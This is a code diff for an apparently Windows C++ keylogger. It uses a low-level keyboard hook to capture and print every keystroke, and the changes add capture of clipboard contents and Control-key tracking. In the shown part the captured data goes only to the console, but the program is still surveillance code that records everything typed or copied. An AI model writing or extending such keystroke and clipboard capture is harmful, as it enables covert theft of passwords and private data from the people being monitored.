@@ -1,14 +1,17 @@
 #include "includes.h"
 #include "handleChars.h"
+#include "grabClipboard.h"
 
 
 std::vector<std::string> savedChars = {}; //have to use string for TAB and stuff like that.
 std::vector<std::string> savedSentences = { "" }; //init emtpy string fist off
+std::string storedClipboardContents = "";
 
 //main entry point
 
 HHOOK handle_to_hook;
 bool is_shift_on = false; //GLOBAL
+bool is_control_on = false; //global
 
 #define USE_LITERALS false;
 
@@ -23,14 +26,21 @@ LRESULT CALLBACK proc(int code, WPARAM wparam, LPARAM lparam)
 #else
 
 	is_shift_on = handleShift();
+	is_control_on = handleCTRL();
+
 	//shift handling handling here, we do not need to print anything :)
 	if (!(keyboardStruct->vkCode == 160 || keyboardStruct->vkCode == 161))
 	{
 		if (wparam == WM_KEYDOWN)
 		{
+			if (is_control_on) { std::cout << "CTRL + "; }
 			std::cout << handleChars(keyboardStruct->vkCode, is_shift_on) << '\n';
-
 		}
+	}
+
+	if (grabClipboard(storedClipboardContents))
+	{
+		std::cout << "CLIPBOARD: " << storedClipboardContents << '\n';
 	}
 
 #endif
